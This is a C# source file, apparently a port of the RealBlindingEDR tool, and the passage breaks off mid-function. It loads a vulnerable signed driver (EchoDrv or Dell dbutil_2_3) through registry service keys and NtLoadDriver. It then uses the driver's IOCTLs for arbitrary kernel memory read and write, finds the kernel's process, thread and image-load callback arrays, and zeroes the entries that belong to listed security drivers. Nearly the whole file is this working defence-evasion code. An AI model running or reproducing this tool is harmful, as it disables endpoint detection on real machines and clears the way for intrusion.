using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using Microsoft.Win32;
using System.ComponentModel;
using System.Collections.Generic;

namespace RealBlindingEDR
{
    class Program
    {
        // Constants and settings
        private static int DriverType = 1; // 1 for echo_driver.sys, 2 for dbutil_2_3.sys
        private const string DrivePath = @"C:\ProgramData\echo_driver.sys";

        // AV/EDR driver names to clear
        private static readonly string[] AVDriver = { null };

        // Handle for the driver
        private static IntPtr hDevice = IntPtr.Zero;
        private static IntPtr ProcessHandle = IntPtr.Zero;
        private static uint dwMajor = 0;
        private static uint dwMinorVersion = 0;
        private static uint dwBuild = 0;
        private static long[] EDRIntance = new long[500];

        // Native structures
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct RTL_PROCESS_MODULE_INFORMATION
        {
            public IntPtr Section;
            public IntPtr MappedBase;
            public IntPtr ImageBase;
            public uint ImageSize;
            public uint Flags;
            public ushort LoadOrderIndex;
            public ushort InitOrderIndex;
            public ushort LoadCount;
            public ushort OffsetToFileName;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
            public byte[] FullPathName;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct RTL_PROCESS_MODULES
        {
            public uint NumberOfModules;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public RTL_PROCESS_MODULE_INFORMATION[] Modules;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct GetHandle
        {
            public uint pid;
            public uint access;
            public IntPtr handle;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ReadMem
        {
            public IntPtr targetProcess;
            public IntPtr fromAddress;
            public IntPtr toAddress;
            public UIntPtr length;
            public IntPtr padding;
            public uint returnCode;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct DellBuff
        {
            public ulong pad1;
            public ulong Address;
            public ulong three1;
            public ulong value;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        // Native methods
        [DllImport("ntdll.dll")]
        private static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(uint Privilege, bool Enable, bool CurrentThread, out uint PreviousState);

        [DllImport("ntdll.dll")]
        private static extern uint NtLoadDriver(ref UNICODE_STRING DriverServiceName);

        [DllImport("ntdll.dll")]
        private static extern uint NtUnloadDriver(ref UNICODE_STRING DriverServiceName);

        [DllImport("ntdll.dll")]
        private static extern void RtlGetNtVersionNumbers(out uint MajorVersion, out uint MinorVersion, out uint BuildNumber);

        [DllImport("ntdll.dll")]
        private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DeviceIoControl(IntPtr hDevice, uint dwIoControlCode, IntPtr lpInBuffer, uint nInBufferSize, IntPtr lpOutBuffer, uint nOutBufferSize, out uint lpBytesReturned, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("psapi.dll", SetLastError = true)]
        private static extern bool EnumDeviceDrivers(IntPtr[] lpImageBase, uint cb, out uint lpcbNeeded);

        [DllImport("psapi.dll", SetLastError = true)]
        private static extern uint GetDeviceDriverBaseNameA(IntPtr ImageBase, StringBuilder lpBaseName, uint nSize);

        // Constants for CreateFile
        private const uint GENERIC_READ = 0x80000000;
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_ATTRIBUTE_NORMAL = 0x80;

        // Constants for DeviceIoControl
        private const uint IOCTL_ECHO_HELLO = 0x9e6a0594;
        private const uint IOCTL_ECHO_GET_HANDLE = 0xe6224248;
        private const uint IOCTL_DELL_READ = 0x9B0C1EC4;
        private const uint IOCTL_DELL_WRITE = 0x9B0C1EC8;
        private const uint IOCTL_ECHO_MEMCPY = 0x60a26124;

        // Main method
        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("=== RealBlindingEDR C# 版本 ===");
                Console.WriteLine("原作者: @Hagrid29");
                Console.WriteLine("C#移植: OpenHands");
                Console.WriteLine("开始执行程序...\n");

                // 处理命令行参数
                if (args.Length > 0)
                {
                    Console.WriteLine($"[调试] 收到命令行参数: {string.Join(", ", args)}");
                    if (args[0] == "1")
                    {
                        DriverType = 1;
                        Console.WriteLine("[信息] 使用EchoDrv驱动");
                    }
                    else if (args[0] == "2")
                    {
                        DriverType = 2;
                        Console.WriteLine("[信息] 使用DBUtil驱动");
                    }
                    else
                    {
                        Console.WriteLine($"[警告] 未知的驱动类型参数: {args[0]}，使用默认驱动类型: {DriverType}");
                    }
                }
                else
                {
                    Console.WriteLine($"[信息] 未指定驱动类型，使用默认驱动类型: {DriverType}");
                }

                Console.WriteLine("[信息] 获取Windows版本信息...");
                RtlGetNtVersionNumbers(out dwMajor, out dwMinorVersion, out dwBuild);
                dwBuild &= 0xffff;
                Console.WriteLine($"[信息] Windows版本: {dwMajor}.{dwMinorVersion}.{dwBuild}");

                if (!IsAdministrator())
                {
                    Console.WriteLine("[错误] 请以管理员身份运行此程序！");
                    return;
                }
                Console.WriteLine("[信息] 管理员权限检查通过");

                Console.WriteLine("[信息] 开始初始化驱动...");
                if (!InitialDriver())
                {
                    Console.WriteLine("[错误] 驱动初始化失败！");
                    return;
                }
                Console.WriteLine("[成功] 驱动初始化成功！");

                Console.WriteLine("\n[信息] 开始清除进程/线程/镜像加载回调...");
                ClearThreeCallBack();
                
                Console.WriteLine("\n[信息] 开始清除对象回调...");
                ClearObRegisterCallbacks();
                
                Console.WriteLine("\n[信息] 开始清除注册表回调...");
                ClearCmRegisterCallback();
                
                Console.WriteLine("\n[信息] 开始清除文件系统微过滤器回调...");
                ClearMiniFilterCallback();

                Console.WriteLine("\n[信息] 开始卸载驱动...");
                UnloadDrive();
                Console.WriteLine("[成功] 驱动卸载完成");
                
                Console.WriteLine("\n程序执行完毕。按任意键继续...");
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"\n[严重错误] 程序执行过程中发生异常: {ex.Message}");
                Console.WriteLine($"异常详情: {ex}");
                Console.WriteLine("\n按任意键退出...");
                Console.ReadKey();
            }
        }

        // Load the driver
        private static bool LoadDriver()
        {
            try
            {
                Console.WriteLine("[调试] 开始加载驱动...");
                string driverPath = "";
                
                if (DriverType == 1)
                {
                    driverPath = @"C:\ProgramData\echo_driver.sys";
                    Console.WriteLine($"[调试] 使用EchoDrv驱动路径: {driverPath}");
                }
                else if (DriverType == 2)
                {
                    driverPath = @"C:\ProgramData\dbutil_2_3.sys";
                    Console.WriteLine($"[调试] 使用DBUtil驱动路径: {driverPath}");
                }
                
                // 检查驱动文件是否存在
                if (!System.IO.File.Exists(driverPath))
                {
                    Console.WriteLine($"[错误] 驱动文件不存在: {driverPath}");
                    return false;
                }
                Console.WriteLine("[调试] 驱动文件存在，继续加载过程");
                
                Console.WriteLine("[调试] 创建注册表项...");
                using (RegistryKey hKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet", true))
                {
                    if (hKey == null)
                    {
                        Console.WriteLine("[错误] 无法打开注册表项: System\\CurrentControlSet");
                        return false;
                    }

                    RegistryKey hsubkey = hKey.CreateSubKey("RealBlindingEDR");
                    if (hsubkey == null)
                    {
                        Console.WriteLine("[错误] 无法创建注册表项: RealBlindingEDR");
                        return false;
                    }

                    string pdata = "\\??\\" + driverPath;
                    Console.WriteLine($"[调试] 设置驱动路径: {pdata}");
                    hsubkey.SetValue("ImagePath", pdata, RegistryValueKind.ExpandString);
                    hsubkey.SetValue("Type", 1, RegistryValueKind.DWord);
                    Console.WriteLine("[调试] 注册表配置完成");
                }

                Console.WriteLine("[调试] 创建服务注册表项...");
                using (RegistryKey hKey = Registry.LocalMachine.OpenSubKey("System\\CurrentControlSet\\services", true))
                {
                    if (hKey == null)
                    {
                        Console.WriteLine("[错误] 无法打开服务注册表项");
                        return false;
                    }

                    hKey.CreateSubKey("RealBlindingEDR");
                    Console.WriteLine("[调试] 服务注册表项创建成功");
                }

                Console.WriteLine("[调试] 调整权限...");
                uint previousState;
                uint status = RtlAdjustPrivilege(0xa, true, false, out previousState);

                if (status != 0)
                {
                    Console.WriteLine($"[错误] 调整权限失败，状态码: {status:X}");
                    return false;
                }
                Console.WriteLine("[调试] 权限调整成功");

                Console.WriteLine("[调试] 加载驱动...");
                UNICODE_STRING szSymbolicLink = new UNICODE_STRING();
                RtlInitUnicodeString(ref szSymbolicLink, "\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
                uint errcode = NtLoadDriver(ref szSymbolicLink);

                if (errcode >= 0)
                {
                    Console.WriteLine("[调试] 驱动加载成功");
                    return true;
                }
                else
                {
                    Console.WriteLine($"[错误] 驱动加载失败，错误码: {errcode:X}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[严重错误] 加载驱动时发生异常: {ex.Message}");
                Console.WriteLine($"异常详情: {ex}");
                return false;
            }
        }

        // Unload the driver
        private static void UnloadDrive()
        {
            try
            {
                Console.WriteLine("[调试] 开始卸载驱动...");
                
                Console.WriteLine("[调试] 调整权限...");
                uint previousState;
                uint status = RtlAdjustPrivilege(0xa, true, false, out previousState);
                if (status != 0)
                {
                    Console.WriteLine($"[错误] 调整权限失败，状态码: {status:X}");
                    return;
                }
                Console.WriteLine("[调试] 权限调整成功");

                Console.WriteLine("[调试] 卸载驱动...");
                UNICODE_STRING szSymbolicLink = new UNICODE_STRING();
                RtlInitUnicodeString(ref szSymbolicLink, "\\Registry\\Machine\\System\\CurrentControlSet\\RealBlindingEDR");
                uint errcode = NtUnloadDriver(ref szSymbolicLink);

                if (errcode >= 0)
                {
                    Console.WriteLine("[成功] 驱动卸载成功");
                    
                    try
                    {
                        Console.WriteLine("[调试] 清理注册表...");
                        Registry.LocalMachine.DeleteSubKey("System\\CurrentControlSet\\RealBlindingEDR", false);
                        Registry.LocalMachine.DeleteSubKey("System\\CurrentControlSet\\services\\RealBlindingEDR", false);
                        Console.WriteLine("[调试] 注册表清理完成");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[警告] 清理注册表时发生异常: {ex.Message}");
                    }
                }
                else
                {
                    Console.WriteLine($"[错误] 驱动卸载失败，错误码: {errcode:X}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[严重错误] 卸载驱动时发生异常: {ex.Message}");
                Console.WriteLine($"异常详情: {ex}");
            }
        }

        // Initialize the driver
        private static bool InitialDriver()
        {
            try
            {
                Console.WriteLine($"[调试] 初始化驱动类型: {DriverType}");
                
                switch (DriverType)
                {
                    case 1:
                        Console.WriteLine("[调试] 尝试打开EchoDrv驱动...");
                        hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                        
                        if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
                        {
                            int lastError = Marshal.GetLastWin32Error();
                            Console.WriteLine($"[调试] 打开驱动失败，错误码: {lastError}，尝试加载驱动...");
                            
                            if (LoadDriver())
                            {
                                Console.WriteLine("[信息] 驱动加载成功，重新尝试打开驱动...");
                                hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                                
                                if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
                                {
                                    lastError = Marshal.GetLastWin32Error();
                                    Console.WriteLine($"[错误] 加载后仍无法打开驱动，错误码: {lastError}");
                                    return false;
                                }
                            }
                            else
                            {
                                Console.WriteLine("[错误] 驱动加载失败");
                                return false;
                            }
                        }
                        Console.WriteLine("[调试] 驱动句柄获取成功");

                        Console.WriteLine("[调试] 分配内存缓冲区...");
                        IntPtr buf = Marshal.AllocHGlobal(4096);
                        uint bytesRet = 0;
                        
                        Console.WriteLine("[调试] 发送IOCTL_ECHO_HELLO命令...");
                        bool success = DeviceIoControl(hDevice, IOCTL_ECHO_HELLO, IntPtr.Zero, 0, buf, 4096, out bytesRet, IntPtr.Zero);
                        if (!success)
                        {
                            int lastError = Marshal.GetLastWin32Error();
                            Console.WriteLine($"[错误] 初始化驱动失败，错误码: {lastError}");
                            CloseHandle(hDevice);
                            Marshal.FreeHGlobal(buf);
                            return false;
                        }
                        Console.WriteLine("[调试] IOCTL_ECHO_HELLO命令成功");

                        Console.WriteLine("[调试] 准备获取进程句柄...");
                        int currentPid = Process.GetCurrentProcess().Id;
                        Console.WriteLine($"[调试] 当前进程ID: {currentPid}");
                        
                        GetHandle param = new GetHandle
                        {
                            pid = (uint)currentPid,
                            access = GENERIC_READ | GENERIC_WRITE
                        };

                        IntPtr paramPtr = Marshal.AllocHGlobal(Marshal.SizeOf(param));
                        Marshal.StructureToPtr(param, paramPtr, false);

                        Console.WriteLine("[调试] 发送IOCTL_ECHO_GET_HANDLE命令...");
                        success = DeviceIoControl(hDevice, IOCTL_ECHO_GET_HANDLE, paramPtr, (uint)Marshal.SizeOf(param), paramPtr, (uint)Marshal.SizeOf(param), out bytesRet, IntPtr.Zero);
                        if (!success)
                        {
                            int lastError = Marshal.GetLastWin32Error();
                            Console.WriteLine($"[错误] 获取进程句柄失败，错误码: {lastError}");
                            CloseHandle(hDevice);
                            Marshal.FreeHGlobal(paramPtr);
                            Marshal.FreeHGlobal(buf);
                            return false;
                        }

                        param = (GetHandle)Marshal.PtrToStructure(paramPtr, typeof(GetHandle));
                        ProcessHandle = param.handle;
                        Console.WriteLine($"[调试] 获取进程句柄成功: 0x{ProcessHandle.ToInt64():X}");

                        Marshal.FreeHGlobal(paramPtr);
                        Marshal.FreeHGlobal(buf);
                        break;
                        
                    case 2:
                        Console.WriteLine("[调试] 尝试打开DBUtil_2_3驱动...");
                        hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                        
                        if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
                        {
                            int lastError = Marshal.GetLastWin32Error();
                            Console.WriteLine($"[调试] 打开驱动失败，错误码: {lastError}，尝试加载驱动...");
                            
                            if (LoadDriver())
                            {
                                Console.WriteLine("[信息] 驱动加载成功，重新尝试打开驱动...");
                                hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                                
                                if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
                                {
                                    lastError = Marshal.GetLastWin32Error();
                                    Console.WriteLine($"[错误] 加载后仍无法打开驱动，错误码: {lastError}");
                                    return false;
                                }
                            }
                            else
                            {
                                Console.WriteLine("[错误] 驱动加载失败");
                                return false;
                            }
                        }
                        Console.WriteLine("[调试] DBUtil_2_3驱动句柄获取成功");
                        break;
                        
                    default:
                        Console.WriteLine("[错误] 指定了无效的驱动类型");
                        return false;
                }
                
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[严重错误] 初始化驱动时发生异常: {ex.Message}");
                Console.WriteLine($"异常详情: {ex}");
                return false;
            }
        }

        // Read memory using Dell driver
        private static ulong DellRead(IntPtr Address)
        {
            DellBuff ReadBuff = new DellBuff
            {
                pad1 = 0x4141414141414141,
                Address = (ulong)Address.ToInt64(),
                three1 = 0,
                value = 0
            };

            IntPtr buffPtr = Marshal.AllocHGlobal(Marshal.SizeOf(ReadBuff));
            Marshal.StructureToPtr(ReadBuff, buffPtr, false);

            uint BytesRead = 0;
            bool success = DeviceIoControl(hDevice, IOCTL_DELL_READ, buffPtr, (uint)Marshal.SizeOf(ReadBuff), buffPtr, (uint)Marshal.SizeOf(ReadBuff), out BytesRead, IntPtr.Zero);
            if (!success)
            {
                Console.WriteLine("Memory read failed. 1");
                CloseHandle(hDevice);
                Marshal.FreeHGlobal(buffPtr);
                return 0;
            }

            ReadBuff = (DellBuff)Marshal.PtrToStructure(buffPtr, typeof(DellBuff));
            Marshal.FreeHGlobal(buffPtr);
            return ReadBuff.value;
        }

        // Write memory using Dell driver
        private static void DellWrite(IntPtr Address, long value)
        {
            DellBuff WriteBuff = new DellBuff
            {
                pad1 = 0x4141414141414141,
                Address = (ulong)Address.ToInt64(),
                three1 = 0,
                value = (ulong)value
            };

            IntPtr buffPtr = Marshal.AllocHGlobal(Marshal.SizeOf(WriteBuff));
            Marshal.StructureToPtr(WriteBuff, buffPtr, false);

            uint BytesRead = 0;
            bool success = DeviceIoControl(hDevice, IOCTL_DELL_WRITE, buffPtr, (uint)Marshal.SizeOf(WriteBuff), buffPtr, (uint)Marshal.SizeOf(WriteBuff), out BytesRead, IntPtr.Zero);
            if (!success)
            {
                Console.WriteLine("Memory write failed. 2");
                CloseHandle(hDevice);
                Marshal.FreeHGlobal(buffPtr);
                return;
            }

            Marshal.FreeHGlobal(buffPtr);
        }

        // Write memory using driver
        private static void DriverWriteMemery(IntPtr fromAddress, IntPtr toAddress, UIntPtr len)
        {
            switch (DriverType)
            {
                case 1:
                    ReadMem req = new ReadMem
                    {
                        fromAddress = fromAddress,
                        length = len,
                        targetProcess = ProcessHandle,
                        toAddress = toAddress,
                        padding = IntPtr.Zero,
                        returnCode = 0
                    };

                    IntPtr reqPtr = Marshal.AllocHGlobal(Marshal.SizeOf(req));
                    Marshal.StructureToPtr(req, reqPtr, false);

                    uint bytesRet = 0;
                    bool success = DeviceIoControl(hDevice, IOCTL_ECHO_MEMCPY, reqPtr, (uint)Marshal.SizeOf(req), reqPtr, (uint)Marshal.SizeOf(req), out bytesRet, IntPtr.Zero);
                    if (!success)
                    {
                        Console.WriteLine("Memory read failed.");
                        CloseHandle(hDevice);
                        Marshal.FreeHGlobal(reqPtr);
                        return;
                    }

                    Marshal.FreeHGlobal(reqPtr);
                    break;
                    
                case 2:
                    if (len.ToUInt64() == 8)
                    {
                        long dataAddr = (long)DellRead(fromAddress);
                        DellWrite(toAddress, dataAddr);
                    }
                    else
                    {
                        byte[] buffer = new byte[len.ToUInt32()];
                        for (int i = 0; i < len.ToUInt32(); i++)
                        {
                            IntPtr addr = new IntPtr(fromAddress.ToInt64() + i);
                            buffer[i] = (byte)DellRead(addr);
                        }
                        Marshal.Copy(buffer, 0, toAddress, (int)len.ToUInt32());
                    }
                    break;
                    
                default:
                    Console.WriteLine("Invalid driver type specified.");
                    break;
            }
        }

        // Check if driver is EDR
        private static bool IsEDR(string DriverName)
        {
            foreach (string driver in AVDriver)
            {
                if (driver != null && string.Compare(DriverName, driver, true) == 0)
                {
                    return true;
                }
            }
            return false;
        }

        // Get module base address
        private static IntPtr GetModuleBase(string Name)
        {
            IntPtr moduleInfoPtr = Marshal.AllocHGlobal(1024 * 1024);
            try
            {
                uint returnLength;
                uint status = NtQuerySystemInformation(11, moduleInfoPtr, 1024 * 1024, out returnLength);
                if (status != 0)
                {
                    return IntPtr.Zero;
                }

                RTL_PROCESS_MODULES moduleInfo = (RTL_PROCESS_MODULES)Marshal.PtrToStructure(moduleInfoPtr, typeof(RTL_PROCESS_MODULES));
                
                // We need to manually iterate through the modules
                int moduleSize = Marshal.SizeOf(typeof(RTL_PROCESS_MODULE_INFORMATION));
                for (uint i = 0; i < moduleInfo.NumberOfModules; i++)
                {
                    IntPtr modulePtr = new IntPtr(moduleInfoPtr.ToInt64() + Marshal.SizeOf(typeof(uint)) + (moduleSize * (int)i));
                    RTL_PROCESS_MODULE_INFORMATION module = (RTL_PROCESS_MODULE_INFORMATION)Marshal.PtrToStructure(modulePtr, typeof(RTL_PROCESS_MODULE_INFORMATION));
                    
                    string moduleName = Encoding.ASCII.GetString(module.FullPathName, module.OffsetToFileName, 256 - module.OffsetToFileName).TrimEnd('\0');
                    if (string.Compare(moduleName, Name, true) == 0)
                    {
                        return module.ImageBase;
                    }
                }
                return IntPtr.Zero;
            }
            finally
            {
                Marshal.FreeHGlobal(moduleInfoPtr);
            }
        }

        // Get function address
        private static long GetFuncAddress(string ModuleName, string FuncName)
        {
            IntPtr KBase = GetModuleBase(ModuleName);
            if (KBase == IntPtr.Zero)
            {
                Console.WriteLine("Module base address not found.");
                return 0;
            }

            IntPtr ntos = IntPtr.Zero;
            try
            {
                if (string.Compare(ModuleName, "FLTMGR.sys", true) == 0)
                {
                    string FullModuleName = $"C:\\windows\\system32\\drivers\\{ModuleName}";
                    ntos = LoadLibraryEx(FullModuleName, IntPtr.Zero, 0x00000001); // DONT_RESOLVE_DLL_REFERENCES
                }
                else
                {
                    ntos = LoadLibrary(ModuleName);
                }

                if (ntos == IntPtr.Zero)
                    return 0;

                IntPtr PocAddress = GetProcAddress(ntos, FuncName);
                long Offset = PocAddress.ToInt64() - ntos.ToInt64();
                return KBase.ToInt64() + Offset;
            }
            finally
            {
                if (ntos != IntPtr.Zero)
                    FreeLibrary(ntos);
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);

        // Get PspNotifyRoutineArray
        private static long GetPspNotifyRoutineArray(string KernelCallbackRegFunc)
        {
            long PsSetCallbacksNotifyRoutineAddress = GetFuncAddress("ntoskrnl.exe", KernelCallbackRegFunc);
            if (PsSetCallbacksNotifyRoutineAddress == 0)
                return 0;

            int count = 0;
            long PspSetCallbackssNotifyRoutineAddress = 0;
            ulong PspOffset = 0;
            IntPtr buffer = Marshal.AllocHGlobal(1);
            try
            {
                if (dwMajor >= 10 || (dwMajor == 6 && string.Compare(KernelCallbackRegFunc, "PsSetCreateProcessNotifyRoutine", true) == 0))
                {
                    while (true)
                    {
                        DriverWriteMemery(new IntPtr(PsSetCallbacksNotifyRoutineAddress), buffer, new UIntPtr(1));
                        byte value = Marshal.ReadByte(buffer);
                        if (value == 0xE8 || value == 0xE9)
                        {
                            break;
                        }
                        PsSetCallbacksNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress + 1;
                        if (count == 200)
                        {
                            Console.WriteLine($"{KernelCallbackRegFunc}: The first level CALL/JMP instruction was not found.");
                            return 0;
                        }
                        count++;
                    }

                    for (int i = 4, k = 24; i > 0; i--, k = k - 8)
                    {
                        DriverWriteMemery(new IntPtr(PsSetCallbacksNotifyRoutineAddress + i), buffer, new UIntPtr(1));
                        byte value = Marshal.ReadByte(buffer);
                        PspOffset = ((ulong)value << k) + PspOffset;
                    }
                    if ((PspOffset & 0x00000000ff000000) == 0x00000000ff000000)
                        PspOffset = PspOffset | 0xffffffff00000000;

                    PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress + (long)PspOffset + 5;
                }
                else if (dwMajor == 6)
                {
                    PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress;
                }
                else
                {
                    Console.WriteLine("Unsupported operating system version.");
                    return 0;
                }

                byte SearchByte1 = 0x4C;
                byte SearchByte1_1 = 0x48;
                byte SearchByte2 = 0x8D;
                IntPtr bArray = Marshal.AllocHGlobal(3);
                count = 0;
                try
                {
                    while (count <= 200)
                    {
                        DriverWriteMemery(new IntPtr(PspSetCallbackssNotifyRoutineAddress), bArray, new UIntPtr(3));
                        byte[] values = new byte[3];
                        Marshal.Copy(bArray, values, 0, 3);

                        if (values[0] == SearchByte1 && values[1] == SearchByte2)
                        {
                            if (values[2] == 0x0D || values[2] == 0x15 || values[2] == 0x1D || values[2] == 0x25 || 
                                values[2] == 0x2D || values[2] == 0x35 || values[2] == 0x3D)
                            {
                                break;
                            }
                        }
                        else if (values[0] == SearchByte1_1 && values[1] == SearchByte2)
                        { //2008R2
                            if (values[2] == 0x0D || values[2] == 0x15 || values[2] == 0x1D || values[2] == 0x25 || 
                                values[2] == 0x2D || values[2] == 0x35 || values[2] == 0x3D)
                            {
                                break;
                            }
                        }

                        PspSetCallbackssNotifyRoutineAddress = PspSetCallbackssNotifyRoutineAddress + 1;
                        if (count == 200)
                        {
                            Console.WriteLine($"{KernelCallbackRegFunc}: The second level LEA instruction was not found and the PspSetCallbackssNotifyRoutineAddress array could not be located.");
                            return 0;
                        }
                        count++;
                    }

                    PspOffset = 0;
                    for (int i = 6, k = 24; i > 2; i--, k = k - 8)
                    {
                        DriverWriteMemery(new IntPtr(PspSetCallbackssNotifyRoutineAddress + i), buffer, new UIntPtr(1));
                        byte value = Marshal.ReadByte(buffer);
                        PspOffset = ((ulong)value << k) + PspOffset;
                    }
                    if ((PspOffset & 0x00000000ff000000) == 0x00000000ff000000)
                        PspOffset = PspOffset | 0xffffffff00000000;

                    long PspNotifyRoutineArrayAddress = PspSetCallbackssNotifyRoutineAddress + (long)PspOffset + 7;
                    return PspNotifyRoutineArrayAddress;
                }
                finally
                {
                    Marshal.FreeHGlobal(bArray);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        // Get driver name
        private static string GetDriverName(long DriverCallBackFuncAddr)
        {
            uint bytesNeeded = 0;
            if (EnumDeviceDrivers(null, 0, out bytesNeeded))
            {
                int ArraySize = (int)(bytesNeeded / IntPtr.Size);
                IntPtr[] addressArray = new IntPtr[ArraySize];
                if (EnumDeviceDrivers(addressArray, bytesNeeded, out bytesNeeded))
                {
                    List<long> ArrayMatch = new List<long>();
                    for (int i = 0; i < ArraySize - 1; i++)
                    {
                        if (DriverCallBackFuncAddr > addressArray[i].ToInt64())
                        {
                            ArrayMatch.Add(addressArray[i].ToInt64());
                        }
                    }

                    long tmp = 0;
                    long MatchAddr = 0;
                    for (int i = 0; i < ArrayMatch.Count; i++)
                    {
                        if (i == 0)
                        {
                            tmp = Math.Abs(DriverCallBackFuncAddr - ArrayMatch[i]);
                            MatchAddr = ArrayMatch[i];
                        }
                        else if (Math.Abs(DriverCallBackFuncAddr - ArrayMatch[i]) < tmp)
                        {
                            tmp = Math.Abs(DriverCallBackFuncAddr - ArrayMatch[i]);
                            MatchAddr = ArrayMatch[i];
                        }
                    }

                    StringBuilder DriverName = new StringBuilder(1024);
                    if (GetDeviceDriverBaseNameA(new IntPtr(MatchAddr), DriverName, 1024) > 0)
                    {
                        return DriverName.ToString();
                    }
                }
            }
            return null;
        }

        // Print and clear callback
        private static void PrintAndClearCallBack(long PspNotifyRoutineAddress, string CallBackRegFunc)
        {
            Console.WriteLine("----------------------------------------------------");
            Console.WriteLine($"Register driver for {CallBackRegFunc} callback: ");
            Console.WriteLine("----------------------------------------------------\n");

            IntPtr bufferPtr = Marshal.AllocHGlobal(8);
            IntPtr dataPtr = Marshal.AllocHGlobal(8);
            try
            {
                for (int k = 0; k < 64; k++)
                {
                    DriverWriteMemery(new IntPtr(PspNotifyRoutineAddress + (k * 8)), bufferPtr, new UIntPtr(8));
                    long buffer = Marshal.ReadInt64(bufferPtr);
                    if (buffer == 0) continue;

                    long tmpaddr = ((buffer >> 4) << 4);
                    if (tmpaddr == 0) continue;

                    DriverWriteMemery(new IntPtr(tmpaddr + 8), bufferPtr, new UIntPtr(8));
                    long DriverCallBackFuncAddr = Marshal.ReadInt64(bufferPtr);
                    string DriverName = GetDriverName(DriverCallBackFuncAddr);

                    if (DriverName != null)
                    {
                        Console.Write(DriverName);
                        if (IsEDR(DriverName))
                        {
                            Marshal.WriteInt64(dataPtr, 0);
                            DriverWriteMemery(dataPtr, new IntPtr(PspNotifyRoutineAddress + (k * 8)), new UIntPtr(8));
                            Console.WriteLine("\t[Clear]");
                        }
                        else
                        {
                            Console.WriteLine();
                        }
                    }
                }
                Console.WriteLine();
            }
            finally
            {
                Marshal.FreeHGlobal(bufferPtr);
                Marshal.FreeHGlobal(dataPtr);
            }
        }

        // Clear three callbacks
        private static void ClearThreeCallBack()
        {
            long PspCreateProcessNotifyRoutineAddress = GetPspNotifyRoutineArray("PsSetCreateProcessNotifyRoutine");
            long PspCreateThreadNotifyRoutineAddress = GetPspNotifyRoutineArray("PsSetCreateThreadNotifyRoutine");
            long PspLoadImageNotifyRoutineAddress = GetPspNotifyRoutineArray("PsSetLoadImageNotifyRoutine");

            if (PspCreateProcessNotifyRoutineAddress != 0)
            {
                PrintAndClearCallBack(PspCreateProcessNotifyRoutineAddress, "PsSetCreateProcessNotifyRoutine");
            }
            else
            {
                Console.WriteLine("Failed to obtain process callback address.");
            }

            if (PspCreateThreadNotifyRoutineAddress != 0)
            {
                PrintAndClearCallBack(PspCreateThreadNotifyRoutineAddress, "PsSetCreateThreadNotifyRoutine");
            }
            else
            {
                Console.WriteLine("Failed to obtain thread callback address.");
            }

            if (PspLoadImageNotifyRoutineAddress != 0)
            {
                PrintAndClearCallBack(PspLoadImageNotifyRoutineAddress, "PsSetLoadImageNotifyRoutine");
            }
            else
            {
                Console.WriteLine("Image loading callback address acquisition failed.");
            }
        }

        // Get PsProcessAndProcessTypeAddr
        private static long GetPsProcessAndProcessTypeAddr(int flag)
        {
